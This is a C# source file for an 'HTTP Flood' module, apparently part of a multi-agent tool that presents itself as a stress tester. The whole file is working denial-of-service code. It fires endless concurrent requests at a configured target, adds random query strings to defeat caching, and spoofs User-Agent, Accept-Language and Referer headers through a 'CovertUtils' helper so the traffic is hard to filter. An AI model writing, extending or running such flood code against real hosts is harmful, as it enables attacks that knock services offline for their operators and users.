using System.Net.Sockets;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Modules.StressTest;

public class HttpFlood : IStressMethod
{
    public string Name => "HTTP Flood";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var handler = new SocketsHttpHandler
        {
            MaxConnectionsPerServer = config.MaxConnections,
            PooledConnectionLifetime = TimeSpan.FromMinutes(2)
        };

        using var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(10) };
        client.DefaultRequestHeaders.ExpectContinue = false;

        var sem = new SemaphoreSlim(config.ThreadsPerAgent);

        while (!ct.IsCancellationRequested)
        {
            await sem.WaitAsync(ct);

            _ = Task.Run(async () =>
            {
                try
                {
                    var isPost = Random.Shared.Next(10) == 0;
                    var request = new HttpRequestMessage(
                        isPost ? HttpMethod.Post : HttpMethod.Get,
                        $"http://{config.TargetHost}:{config.TargetPort}{config.HttpPath}?{Guid.NewGuid():N}");

                    request.Headers.UserAgent.TryParseAdd(CovertUtils.RandomUserAgent());
                    request.Headers.AcceptLanguage.TryParseAdd(CovertUtils.RandomAcceptLanguage());
                    var referer = CovertUtils.RandomReferer();
                    if (referer != null) request.Headers.Referrer = new Uri(referer);
                    request.Headers.CacheControl = new System.Net.Http.Headers.CacheControlHeaderValue { NoCache = true };

                    long bytes = 0;
                    if (isPost)
                    {
                        var payload = CovertUtils.RandomPayload(64, config.PacketSize);
                        request.Content = new ByteArrayContent(payload);
                        bytes = payload.Length;
                    }

                    rpt.IncrementConnections(1);
                    using var response = await client.SendAsync(request, ct);
                    rpt.IncrementConnections(-1);

                    rpt.IncrementPackets();
                    rpt.IncrementBytes(bytes + 1024); // request + estimated response overhead
                }
                catch { /* connection errors expected during flood */ }
                finally { sem.Release(); }
            }, ct);
        }
    }
}
